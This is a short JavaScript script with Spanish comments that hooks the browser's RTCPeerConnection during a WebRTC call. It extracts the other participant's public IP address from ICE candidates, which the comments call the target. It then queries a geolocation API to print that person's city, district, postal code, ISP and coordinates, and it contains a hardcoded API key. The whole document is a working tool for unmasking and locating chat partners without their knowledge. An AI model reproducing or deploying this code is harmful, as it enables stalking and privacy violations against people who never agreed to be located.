//Reemplaza el valor de la api-key por tu propia Api-key de https://ipgeolocation.io/
let apiKey = "e2fb6d69079348edaeb12e516b94856c";

//Abrimos una conexion con el objetivo
window.oRTCPeerConnection =
    window.oRTCPeerConnection || window.RTCPeerConnection;

//Obtención de la IP
window.RTCPeerConnection = function(...args) {
    const host = new window.oRTCPeerConnection(...args);
    //Obtenemos un ICE candidate
    host.oaddIceCandidate = host.addIceCandidate;
    //Extraemos la información del candidato
    host.addIceCandidate = function(iceCandidate, ...rest) {
        const campos = iceCandidate.candidate.split(" ");

        console.log(iceCandidate.candidate);
        //Obtenemos la IP
        const ip = campos[4];
        //Si la IP es de un candidato reflexivo (target) obtenemos su localización
        if (campos[7] === "srflx") {
            getLocalizacion(ip);
        }
        return host.oaddIceCandidate(iceCandidate, ...rest);
    };
    return host;
};

//Geolocalizacion de la IP
let getLocalizacion = async (ip) => {
    let url_geo = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;

    //Hacemos una peticion de manera asincrona con fetch
    await fetch(url_geo).then((response) =>
        //Paseamos el json y formateamos
        response.json().then((json) => {
            const output = `
          ---------------------
          IP: ${json.ip}
          Continente: ${json.continent_name}
          Pais: ${json.country_name}
          Estado: ${json.state_prov}
          Ciudad: ${json.city}
          Zona: ${json.district}
          Codigo Postal: ${json.zipcode}
          ISP: ${json.isp}
          Lat / Long: (${json.latitude}, ${json.longitude})
          ---------------------
          `;
            //Se devuelve el resultado
            console.log(output);
        })
    );
};